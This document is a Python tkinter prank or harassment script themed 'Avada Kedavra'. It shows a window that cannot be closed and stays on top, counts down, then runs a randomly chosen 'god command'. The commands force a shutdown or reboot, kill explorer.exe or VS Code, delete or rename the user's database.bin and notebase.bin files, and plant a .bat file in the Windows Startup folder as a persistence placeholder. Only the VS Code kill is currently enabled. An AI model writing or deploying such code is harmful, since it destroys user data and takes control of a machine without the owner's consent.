from random import choice as i_choose_the_command
from tkinter import Label, messagebox
import tkinter as tk
import subprocess
import threading
import os


def force_shutdown():
    try:
        subprocess.run(["shutdown", "/s", "/t", "3"])
    except Exception as ex:
        pass


def force_reboot():
    try:
        subprocess.run(["shutdown", "/r", "/t", "0"])
    except Exception as ex:
        pass


def force_taskkill():
    try:
        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"])
    except Exception as ex:
        pass
    
def force_taskkill_vscode():
    try:
        subprocess.run(["taskkill", "/f", "/im", "code.exe"])
    except Exception as ex:
        pass


def force_database_deletion():
    database_pattern = 'database.bin'
    user_profile = os.environ['USERPROFILE']
    user_profile_path = os.path.join(user_profile, '')
    try:
        files_in_user_profile = os.listdir(user_profile)
        for file_name in files_in_user_profile:
            if database_pattern in file_name:
                file_path = os.path.join(user_profile_path, file_name)
                os.remove(file_path)
    except Exception as e:
        print(f"Error deleting files: {e}")


def force_notebase_deletion():
    database_pattern = 'notebase.bin'
    user_profile = os.environ['USERPROFILE']
    user_profile_path = os.path.join(user_profile, '')
    try:
        files_in_user_profile = os.listdir(user_profile)
        for file_name in files_in_user_profile:
            if database_pattern in file_name:
                file_path = os.path.join(user_profile_path, file_name)
                os.remove(file_path)
    except Exception as e:
        print(f"Error deleting files: {e}")


def force_database_rename():
    old_base_path = os.path.join(os.environ['USERPROFILE'], "database.bin")
    new_base_path = os.path.join(os.environ['USERPROFILE'], "hello_world1.bin")
    try:
        os.rename(old_base_path, new_base_path)
    except Exception as e:
        print(f"Помилка перейменування файлів: {e}")


def force_notebase_rename():
    old_note_path = os.path.join(os.environ['USERPROFILE'], "notebase.bin")
    new_note_path = os.path.join(os.environ['USERPROFILE'], "hello_world.bin")
    try:
        os.rename(old_note_path, new_note_path)
    except Exception as e:
        print(f"Помилка перейменування файлів: {e}")


def force_reboot_file_creation():
    startup_path = os.path.join(
        os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    file_path = os.path.join(startup_path, 'jul_startup.bat')

    try:
        with open(file_path, 'w') as file:
            file.write("Next time here will be some special commands!")

    except Exception as e:
        print(
            f"Error creating file jul_startup in the Startup folder: {e}")


def shutdown_with_countdown():

    # god_commands = [force_shutdown,
    #             force_reboot,
    #             force_taskkill,
    #             force_taskkill_vscode,
    #             force_database_deletion,
    #             force_notebase_deletion,
    #             force_database_rename,
    #             force_notebase_rename,
    #             force_reboot_file_creation
    #         ]
    
    god_commands = [force_taskkill_vscode]   

    def force_avada():
        print("Good Bye!")
        window.destroy()
        avada_kedavra = i_choose_the_command(god_commands)
        avada_kedavra()

    def on_closing():
        background_thread = threading.Thread(target=force_avada)
        background_thread.daemon = True
        background_thread.start()
        messagebox.showwarning(
            "Error", "You cant interrupt Avada Kedavra!\nAnd thats why i will do it immediately!\n5 seconds left until the completion of the spell - Good Bye!")
        window.destroy()
        avada_kedavra = i_choose_the_command(god_commands)
        avada_kedavra()

    window = tk.Tk()
    window.title("Avada Kedavra casting!")

    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    window_width = 600
    window_height = 300

    x = (screen_width - window_width) // 2
    y = (screen_height - window_height) // 2

    window.geometry(f"{window_width}x{window_height}+{x}+{y}")
    window.configure(bg="blue")
    window.resizable(width=False, height=False)
    window.grab_set()
    window.attributes('-topmost', True)
    window.lift()
    window.protocol("WM_DELETE_WINDOW", on_closing)

    label = Label(window, text="", font=(
        "Helvetica", 20), bg="blue", fg="white")
    label1 = Label(window, text="Avada Kedavra", font=(
        "Helvetica", 20), bg="blue", fg="white")
    label.pack(pady=20)
    label1.pack(pady=20)

    for sec in range(10, 0, -1):
        try:
            label.config(
                text=f"{sec} seconds left until Avada Kedavra completion!")
        except Exception as ex:
            pass
        window.update()
        window.after(1000)

    window.destroy()
    avada_kedavra = i_choose_the_command(god_commands)
    avada_kedavra()